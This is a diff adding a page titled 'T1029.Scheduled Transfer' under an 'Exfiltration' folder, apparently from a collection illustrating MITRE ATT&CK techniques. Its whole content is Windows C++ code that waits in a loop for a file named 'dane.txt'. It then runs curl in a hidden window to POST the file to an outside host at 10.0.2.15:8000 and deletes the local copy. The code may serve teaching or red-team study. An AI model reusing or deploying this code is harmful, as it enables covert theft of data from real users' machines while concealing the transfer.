@@ -1,0 +1,55 @@
+---
+title: "T1029.Scheduled Transfer"
+folder: "13. Exfiltration"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <thread>
+#include <chrono>
+void WyslijPlik() {
+    const char* command = "curl -X POST --data-BINARY \"@dane.txt\" http://10.0.2.15:8000/";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    std::remove("dane.txt");
+}
+
+void SprawdzPlik() {
+    std::string nazwaPliku = "dane.txt";
+    while (true) {
+        auto now = std::chrono::system_clock::now();
+
+        auto timeToExecute = now + std::chrono::seconds(10);
+
+        auto durationToWait = timeToExecute - now;
+
+        std::this_thread::sleep_for(durationToWait);
+        std::ifstream plik(nazwaPliku);
+        if (plik.is_open()) {
+            plik.close();
+            WyslijPlik();
+            break;
+        }
+    }
+}
+ 
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    SprawdzPlik();
+    return 0;
+}
